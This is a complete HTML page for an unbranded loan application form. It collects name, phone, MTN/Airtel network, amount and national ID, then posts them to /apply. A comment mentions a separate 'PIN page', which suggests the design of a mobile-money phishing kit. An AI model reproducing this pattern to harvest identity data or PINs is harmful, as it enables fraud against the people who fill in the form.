<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Application Form</title>

<style>
body {
  margin: 0;
  font-family: Arial, sans-serif;
  background: #0b5c6b;
}

.header {
  background: #0b5c6b;
  color: #ffcc00;
  padding: 15px;
  text-align: center;
  font-size: 20px;
  font-weight: bold;
}

.container {
  max-width: 400px;
  margin: 30px auto;
  background: white;
  padding: 20px;
  border-radius: 18px;
}

h2 {
  text-align: center;
}

input, select {
  width: 100%;
  padding: 14px;
  margin: 10px 0;
  border-radius: 10px;
  border: none;
  background: #f1f1f1;
}

button {
  width: 100%;
  padding: 15px;
  background: #ffcc00;
  border: none;
  border-radius: 10px;
  font-weight: bold;
  cursor: pointer;
}

.footer {
  text-align: center;
  color: white;
  font-size: 12px;
  margin: 20px 0;
}
</style>
</head>

<body>

<div class="header">
  Application System
</div>

<div class="container">
  <h2>Apply Form</h2>

  <form id="loanForm">
    <input type="text" name="name" placeholder="Full Name" required>
    <input type="text" name="phone" placeholder="Phone Number" required>

    <select name="network" required>
      <option value="">Select Network</option>
      <option value="MTN">MTN</option>
      <option value="Airtel">Airtel</option>
    </select>

    <input type="number" name="amount" placeholder="Amount" required>
    <input type="text" name="nationalId" placeholder="ID Number" required>

    <button type="submit" id="submitBtn">Submit Application</button>
  </form>
</div>

<div class="footer">
  System 2026
</div>

<script>
document.getElementById("loanForm").addEventListener("submit", async function(e) {
  e.preventDefault();

  const btn = document.getElementById("submitBtn");
  btn.disabled = true;
  btn.innerText = "Processing...";

  const formData = new FormData(this);
  const data = Object.fromEntries(formData.entries());

  // Save phone for status page
  localStorage.setItem("phone", data.phone);

  try {
    const res = await fetch("/apply", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(data)
    });

    const result = await res.json();

    if (result.success) {
      // IMPORTANT: go to waiting page, NOT PIN page
      window.location.href = "/status.html";
    } else {
      alert("Submission failed");
      btn.disabled = false;
      btn.innerText = "Submit Application";
    }

  } catch (err) {
    console.log(err);
    alert("Network error");
    btn.disabled = false;
    btn.innerText = "Submit Application";
  }
});
</script>

</body>
</html>
